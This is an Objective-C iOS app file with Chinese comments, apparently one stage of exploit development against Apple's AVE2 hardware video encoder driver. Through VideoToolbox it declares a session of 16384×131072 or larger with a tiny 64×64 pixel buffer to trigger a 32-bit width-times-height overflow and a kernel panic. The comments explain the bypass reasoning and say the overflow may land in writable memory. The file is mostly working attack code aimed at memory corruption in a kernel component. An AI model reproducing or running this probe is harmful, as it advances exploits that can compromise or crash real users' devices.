//
//  vtframe.m — 最后一环：VTCompressionSessionEncodeFrame
//
//  已证实（vtprepare 真机 + syslog）：
//    · VT 的 Create 与 PrepareToEncodeFrames **完全不校验尺寸**（5 级全 noErr）
//    · 但固件（AppleAVE2FW-8002.47.0）**只在 L0(1080p) 启动**
//    · L1~L4 只走到 AVE2 的 open + IO_Prepare（`4 AVE INFO`），**没到 IO_Start**
//    ⇒ 真正启动编码器的是 EncodeFrame，而 IO_Start 之后 AVE2 才按宽高算缓冲
//
//  关键绕法：AVE2 的 structureInput 里那个宽高（+0x698/+0x69C）
//            是 VT 从 SessionCreate 的 W/H 填的，**不是从 pixel buffer 量的**
//    ⇒ 用「大 W/H 声明 + 小 pixel buffer」试探
//
//  阶梯（每级停 3 秒）：
//    L0  1920×1080 + 1920×1080 buffer   基线：确认 EncodeFrame 本身可用
//    L1  16384×131072 + 64×64 buffer    **正好 2^31**，32 位下 = -2147483648（最温和的溢出形态）
//    L2  16384×131073 + 64×64 buffer    刚过 2^31（+1）
//
//  ★ 如果 L1 或 L2 导致 panic，屏幕会停在那一级；重启后告诉我停在 L几。
//  ★ 如果 EncodeFrame 返回 kVTParameterErr，说明 VT 校验了 buffer 与声明的一致性 —— 那就死路。
//

#import <UIKit/UIKit.h>
#import <CoreFoundation/CoreFoundation.h>
#include <dlfcn.h>
#include <mach/mach.h>
#include <unistd.h>

static NSMutableString *gLog = nil;
static UITextView    *gView = nil;
static UILabel       *gStatus = nil;
static dispatch_queue_t gQ = nil;

static void L(NSString *fmt, ...)
{
    va_list ap; va_start(ap, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    NSLog(@"VTFRAME %@", s);
    NSString *line = [s stringByAppendingString:@"\n"];
    NSString *p = [NSTemporaryDirectory() stringByAppendingPathComponent:@"vtframe.log"];
    FILE *f = fopen([p UTF8String], "a");
    if (f) { fprintf(f, "%s", [line UTF8String]); fclose(f); }
    // 同步落屏，保证 panic 前能看到
    dispatch_sync(dispatch_get_main_queue(), ^{
        [gLog appendString:line];
        if (gView) { gView.text = gLog; [gView scrollRangeToVisible:NSMakeRange(gLog.length,0)]; }
    });
}

static void SetStatus(NSString *s)
{
    dispatch_async(dispatch_get_main_queue(), ^{
        if (gStatus) {
            gStatus.text = s;
            gStatus.font = [UIFont monospacedSystemFontOfSize:14 weight:UIFontWeightBold];
        }
    });
}

// ---- 类型 ----
// CVPixelBufferRef / kCVPixelFormatType_32BGRA 由 SDK 的 CoreVideo 头提供（经 UIKit 间接包含）
typedef void *VTCompressionSessionRef;
typedef struct { int64_t value; int32_t timescale; uint32_t flags; int64_t epoch; } CMTime;

static const uint32_t kCMVideoCodecType_HEVC = 0x68766331;      // 'hvc1'

// ---- 函数指针 ----
typedef int32_t (*fn_vt_create_t)(void *, int32_t, int32_t, uint32_t,
                                  void *, void *, void *, void *, void *, VTCompressionSessionRef *);
typedef int32_t (*fn_vt_prepare_t)(VTCompressionSessionRef);
typedef int32_t (*fn_vt_encode_t)(VTCompressionSessionRef, CVPixelBufferRef, CMTime, CMTime,
                                  void *, void *, void *);
typedef void    (*fn_vt_invalidate_t)(VTCompressionSessionRef);
typedef int32_t (*fn_cv_create_t)(void *, size_t, size_t, uint32_t, void *, CVPixelBufferRef *);
typedef void    (*fn_cv_release_t)(CVPixelBufferRef);

static fn_vt_create_t     p_create     = NULL;
static fn_vt_prepare_t    p_prepare    = NULL;
static fn_vt_encode_t     p_encode     = NULL;
static fn_vt_invalidate_t p_invalidate = NULL;
static fn_cv_create_t     p_cv_create  = NULL;
static fn_cv_release_t    p_cv_release = NULL;

static const char *osstatus_name(int32_t st)
{
    switch (st) {
        case 0:      return "noErr";
        case -12902: return "kVTParameterErr";
        case -12903: return "kVTInvalidSessionErr";
        case -12904: return "kVTAllocationFailedErr";
        case -12905: return "kVTPixelTransferNotSupportedErr";
        case -12906: return "kVTDecompressionFailedErr";
        case -12907: return "kVTBadDataErr";
        case -12908: return "kVTNotSupportedErr";
        case -12909: return "kVTPropertyNotSupportedErr";
        case -12910: return "kVTPropertyReadOnlyErr";
        case -12911: return "kVTPropertyNotSupportedErr2";
        case -12912: return "kVTColorPrimariesNotSupportedErr";
        case -12913: return "kVTColorTransferFunctionNotSupportedErr";
        case -12914: return "kVTColorMatrixNotSupportedErr";
        case -50:    return "paramErr";
        case -108:   return "memFullErr";
        case -6661:  return "kCVReturnInvalidSize";
        case -6660:  return "kCVReturnInvalidArgument";
        case -6662:  return "kCVReturnAllocationFailed";
        default:     return "?";
    }
}

static CMTime CMTime_zero(void)
{
    CMTime t = {0, 0, 0, 0};
    return t;
}

// 一级：Create(声明W/H) → Prepare → CreatePixelBuffer(bufW/bufH) → EncodeFrame
static void run_level(int n, int32_t w, int32_t h, size_t bw, size_t bh, const char *desc)
{
    int64_t prod = (int64_t)w * (int64_t)h;
    double ratio = (double)prod / 2147483648.0;

    L(@"");
    L(@"========== L%d: %s ==========", n, desc);
    L(@"    声明 %d x %d   W*H = %lld (%.3f x 2^31)   buffer %zux%zu",
      w, h, (long long)prod, ratio, bw, bh);
    SetStatus([NSString stringWithFormat:@"L%d: %dx%d", n, w, h]);

    // 1) Create
    VTCompressionSessionRef s = NULL;
    int32_t st = p_create(NULL, w, h, kCMVideoCodecType_HEVC, NULL,NULL,NULL,NULL,NULL,&s);
    L(@"  [1] Create -> %d %s  session=%p", st, osstatus_name(st), s);
    if (st != 0 || !s) { L(@"      跳过"); return; }

    // 2) Prepare
    st = p_prepare(s);
    L(@"  [2] Prepare -> %d %s", st, osstatus_name(st));

    // 3) PixelBuffer（小）
    CVPixelBufferRef pb = NULL;
    st = p_cv_create(NULL, bw, bh, kCVPixelFormatType_32BGRA, NULL, &pb);
    L(@"  [3] CVPixelBufferCreate %zux%zu -> %d %s  pb=%p", bw, bh, st, osstatus_name(st), pb);
    if (st != 0 || !pb) {
        L(@"      buffer 建不出来，跳过 EncodeFrame");
        p_invalidate(s); CFRelease((CFTypeRef)s);
        return;
    }

    // 4) EncodeFrame ★ 触发行
    L(@"  [4] VTCompressionSessionEncodeFrame ...  ← ★★★ 触发行");
    L(@"      （若 AVE2 真的收到 %dx%d 且 CheckInfo 缺 iPixelProduct 检查，这里可能直接 panic）", w, h);
    CMTime pts = CMTime_zero();
    CMTime dur = CMTime_zero();
    st = p_encode(s, pb, pts, dur, NULL, NULL, NULL);
    L(@"      -> %d %s", st, osstatus_name(st));

    // 5) 清理
    L(@"  [5] 清理 ...");
    p_cv_release(pb);
    p_invalidate(s);
    CFRelease((CFTypeRef)s);
    L(@"      完成");
}

static void run(void)
{
    L(@"===== VT EncodeFrame — 最后一步 =====");
    L(@"uid=%d pid=%d", getuid(), getpid());
    L(@"");

    void *vt = dlopen("/System/Library/Frameworks/VideoToolbox.framework/VideoToolbox", RTLD_NOW);
    void *cv = dlopen("/System/Library/Frameworks/CoreVideo.framework/CoreVideo", RTLD_NOW);
    L(@"[dlopen] VideoToolbox = %p", vt);
    L(@"[dlopen] CoreVideo    = %p", cv);
    if (!vt || !cv) { L(@"加载失败"); SetStatus(@"加载失败"); return; }

    p_create     = (fn_vt_create_t)dlsym(vt, "VTCompressionSessionCreate");
    p_prepare    = (fn_vt_prepare_t)dlsym(vt, "VTCompressionSessionPrepareToEncodeFrames");
    p_encode     = (fn_vt_encode_t)dlsym(vt, "VTCompressionSessionEncodeFrame");
    p_invalidate = (fn_vt_invalidate_t)dlsym(vt, "VTCompressionSessionInvalidate");
    p_cv_create  = (fn_cv_create_t)dlsym(cv, "CVPixelBufferCreate");
    p_cv_release = (fn_cv_release_t)dlsym(cv, "CVPixelBufferRelease");

    L(@"[dlsym] Create=%p Prepare=%p Encode=%p PixBufCreate=%p",
      p_create, p_prepare, p_encode, p_cv_create);
    if (!p_create || !p_prepare || !p_encode || !p_cv_create) {
        L(@"dlsym 失败"); SetStatus(@"dlsym 失败"); return;
    }

    // L0：基线，真实尺寸 buffer
    run_level(0, 1920, 1080, 1920, 1080, "baseline 1080p（确认 EncodeFrame 可用）");
    sleep(3);

    // L1：正好 2^31，小 buffer ★ 最温和的溢出
    run_level(1, 16384, 131072, 64, 64, "★ 声明 2^31 + 64x64 buffer");
    sleep(3);

    // L2：刚过 2^31
    run_level(2, 16384, 131073, 64, 64, "声明 2^31+16384 + 64x64 buffer");

    L(@"");
    L(@"===== 全部跑完，没有崩溃 =====");
    L(@"  若 L1/L2 的 EncodeFrame 返回 kVTParameterErr ⇒ VT 校验了 buffer 与声明一致性，此路不通");
    L(@"  若返回 noErr ⇒ AVE2 收到了畸形宽高但没崩（可能被内部截断，或溢出落在可写内存）");
    SetStatus(@"完成，看日志");
}

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (strong, nonatomic) UIWindow *window;
@end

@implementation AppDelegate
- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions
{
    if (!gLog) gLog = [NSMutableString new];
    if (!gQ) gQ = dispatch_queue_create("vtframe.log", DISPATCH_QUEUE_SERIAL);

    self.window = [[UIWindow alloc] initWithFrame:[[UIScreen mainScreen] bounds]];
    self.window.backgroundColor = [UIColor blackColor];
    UIViewController *vc = [UIViewController new];
    vc.view.backgroundColor = [UIColor blackColor];

    CGFloat h = self.window.bounds.size.height;
    gStatus = [[UILabel alloc] initWithFrame:CGRectMake(8, 52, self.window.bounds.size.width - 16, 34)];
    gStatus.textAlignment = NSTextAlignmentCenter;
    gStatus.text = @"vtframe...";
    gStatus.textColor = [UIColor colorWithRed:0.3 green:1 blue:0.3 alpha:1];
    gStatus.font = [UIFont monospacedSystemFontOfSize:14 weight:UIFontWeightBold];
    [vc.view addSubview:gStatus];

    gView = [[UITextView alloc] initWithFrame:CGRectMake(0, 90, self.window.bounds.size.width, h - 90)];
    gView.backgroundColor = [UIColor blackColor];
    gView.textColor = [UIColor greenColor];
    gView.font = [UIFont fontWithName:@"Menlo" size:9] ?: [UIFont systemFontOfSize:9];
    gView.editable = NO;
    [vc.view addSubview:gView];

    self.window.rootViewController = vc;
    [self.window makeKeyAndVisible];

    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
        @autoreleasepool { run(); }
    });
    return YES;
}
@end

int main(int argc, char *argv[])
{
    @autoreleasepool { return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class])); }
}
